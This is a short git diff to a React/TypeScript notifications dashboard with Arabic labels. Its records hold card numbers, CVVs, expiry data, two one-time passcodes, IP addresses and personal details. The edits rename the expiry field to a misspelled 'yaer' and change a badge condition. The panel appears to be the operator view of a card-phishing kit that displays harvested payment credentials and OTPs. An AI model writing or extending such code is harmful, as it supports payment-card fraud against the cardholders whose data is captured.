@@ -85,7 +85,7 @@ interface Notification {
   ip?: string
   cvv: string
   id: string | "0"
-  expiryDate: string
+  yaer: string
   notificationCount: number
   otp: string
   otp2: string
@@ -1419,11 +1419,11 @@ export default function NotificationsPage() {
                               <td className="px-4 py-3">
                                 <div className="flex flex-wrap gap-2">
                                   <Badge
-                                    variant={notification?.phone ? "secondary" : "destructive"}
+                                    variant={notification?.personalInfo.name ? "secondary" : "destructive"}
                                     className="rounded-md cursor-pointer hover:bg-secondary/80 transition-colors"
                                     onClick={() => handleInfoClick(notification, "personal")}
                                   >
-                                    {notification?.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
+                                    {notification?.personalInfo.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                   </Badge>
                                   <Badge
                                     variant={notification.cardNumber ? "secondary" : "destructive"}
@@ -1845,7 +1845,7 @@ export default function NotificationsPage() {
                   <span className="font-semibold">
                     {selectedNotification.year && selectedNotification.month
                       ? `${selectedNotification.year}/${selectedNotification.month}`
-                      : selectedNotification.cardExpiry}
+                      : selectedNotification.yaer}
                   </span>
                 </div>
               )}
